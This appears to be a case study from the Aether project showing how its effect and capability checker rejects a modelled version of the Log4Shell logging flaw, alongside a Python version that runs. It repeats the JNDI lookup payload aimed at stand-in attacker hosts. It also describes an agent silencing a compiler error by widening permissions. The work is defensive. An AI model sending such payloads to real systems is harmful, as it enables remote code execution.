# Case Study: Aether on Log4Shell (CVE-2021-44228)

**Date:** 2026-07-04
**Target:** Apache Log4j 2 — message-lookup substitution / JNDI RCE.
**What this is:** a worked example of running the Aether toolchain
against a faithful model of the most-exploited architecture-class bug
of the decade, with the honest boundary of what "running Aether on it"
does and does not mean stated up front.

---

## 1. Why Log4Shell

Log4j 2 supported *message lookup substitution*: a logged string such
as `${jndi:ldap://attacker/x}` was interpreted at log time, triggering
a JNDI lookup that opened a network connection to an attacker-controlled
LDAP server and loaded a remote Java class — remote code execution on
the machine doing the logging. Applications are exploitable because they
log untrusted input all the time (User-Agent headers, form fields, chat
messages). Sources: [Cloudflare](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/),
[Huntress](https://www.huntress.com/threat-library/vulnerabilities/cve-2021-44228),
[Unit 42](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/).

The bug is not a logic error. It is an **architectural** one: a function
the whole application reads as "take a string, write a log line"
secretly reaches the network. That is the precise failure class Aether's
effect + capability system exists to make unrepresentable — the same
threat model as the repo's `demos/capability-firewall`, applied to a
CVE everyone recognizes.

## 2. What "running Aether on it" means here — read this first

Aether reasons about **Aether source**. It is a transpiler-to-Python
with a static effect/capability/refinement checker; it does not ingest
Java, and it did not scan the Log4j codebase. This case study takes the
*architecturally load-bearing boundary* — the log call and the
substitution it delegates to — and re-expresses it in Aether, then runs
the real toolchain (`aether check` / `aether run`). Every diagnostic
below is produced by the shipping compiler, not narrated.

The honest claim is therefore about the **failure class and the
boundary**, not "Aether scans your Java." Aether would have caught the
real Log4j *if the logging library had been written in Aether with
declared effects* — because then the network reach in the substitution
path could not have hidden behind a `void log(String)` surface. See §6
for exactly where that boundary sits.

## 3. Files

```
aether/vulnerable.aeth          the log-call boundary, honestly typed  -> REJECTED
aether/vulnerable_widened.aeth  agent "fixes" it the lazy way          -> REJECTED (2nd gate)
aether/fixed.aeth               Log4j 2.16 behavior (lookups off)      -> COMPILES + RUNS
python/vulnerable.py            the same shape in Python               -> RUNS, mypy --strict clean
```

## 4. Results (reproduced by the shipping toolchain)

### 4.1 Vulnerable — rejected at the effect boundary

`handleRequest` is declared `effects log` (write-only — what every
caller assumes). It calls `substitute`, whose true effect set includes
`net.fetch` via the JNDI resolver.

```
$ aether check aether/vulnerable.aeth
[E0801] error (effect) at line 50, col 1: function 'handleRequest'
  (effects 'log') calls 'substitute' which has effect
  'net.fetch('ldap://*')' not covered by the caller
  hint: add 'net.fetch('ldap://*')' to handleRequest's effects clause,
        or change the call site
exit 2
```

The logger cannot silently reach the network. The lie that Log4Shell
exploited — "logging only logs" — is a compile error.

### 4.2 Agent tries the lazy fix — rejected at the capability boundary

Suppose a fix-loop silences E0801 the cheap way: widen every effects
clause up the chain to include `net.fetch`. The effect checker goes
quiet, but the architecture is still wrong, and the **module capability
gate** fires next — the module declared `requires capability log`, never
`net`:

```
$ aether check aether/vulnerable_widened.aeth
[E0701] error (capability) at line 16: function 'jndiResolve' directly
  performs effect 'net.fetch' which requires capability 'net', but no
  module in this program declares it
[E0701] ... 'substitute' ...
[E0701] ... 'handleRequest' ...
[E0701] ... 'main' ...
exit 2
```

Two independent locks, both in source, both auditable. An agent cannot
make the smell go away without writing `requires capability net` into
the module header in plain sight — where a human reviewer, or a policy
lint, sees it.

### 4.3 Fixed — compiles and runs

Log4j 2.16.0 disabled message lookups by default. Modeled as pure
string substitution (no network reach), the composition is honest and
Aether accepts it:

```
$ aether check aether/fixed.aeth
OK: aether/fixed.aeth (4 decls)

$ aether run aether/fixed.aeth
LOG ${jndi:ldap://attacker.example/exploit}
```

The identical attacker payload is now logged as an inert literal.

### 4.4 The Python control — it runs, and mypy is silent

```
$ python3 -B python/vulnerable.py
LOG REMOTE_CLASS_FROM:${jndi:ldap://attacker.example/exploit}   # exit 0

$ mypy --strict python/vulnerable.py
Success: no issues found in 1 source file                        # exit 0
```

The strongest Python type checker, in its strictest mode, has **zero**
objection to a logging function that reaches the network. This is the
empirical anti-overclaim: the gap Aether fills is not one mypy is
failing to fill through misconfiguration — it is one the type system
has no vocabulary for.

## 5. What this exercises, precisely

| Aether axis | Exercised? | How |
|---|---|---|
| B.1 effect locality | yes | `log` caller cannot reach `net.fetch` (§4.1) |
| B.3 module capability | yes | `net` capability never granted (§4.2) |
| B.2 URL discipline | partially | the reach is `ldap://*`; a logger scoped to a real telemetry glob would reject `ldap://attacker` as a glob mismatch too |
| B.4 refinement types | no | not a boundary-value bug |

## 6. Honesty — limits of this result

- **This is a model of the boundary, not a scan of Log4j.** Aether has
  no Java front end. The value shown is that the *failure class* is
  compile-time-unrepresentable when the boundary is written in Aether.
- **Aether's reach stops at the Aether/foreign edge.** In Aether v0.3
  every function is Aether source with a declared effect; there is no
  FFI. Had the network call lived behind an opaque foreign call with no
  declared effect, Aether could not see past it — the same way it could
  not see into Log4j's Java. The enforcement is only as deep as the
  Aether-typed surface. That surface is the product boundary, and the
  design bet is that agents write the boundary module in Aether.
- **The naive candidate is hand-built, not sampled from a model.** Like
  the `bench/architectural` corpus, this is a curated faithful model of
  the documented CVE mechanics, not an LLM-generated reproduction.
- **No network was performed.** Both the Aether and Python models use a
  string marker in place of a real LDAP dereference; the demo is safe to
  run in CI.

## 7. One-line takeaway

Log4Shell was a `void log(String)` that opened a socket. In Python —
even under `mypy --strict` — that composition type-checks and runs. In
Aether the same composition does not compile, and an agent cannot
silence the objection without writing the forbidden capability into the
module header in plain sight.
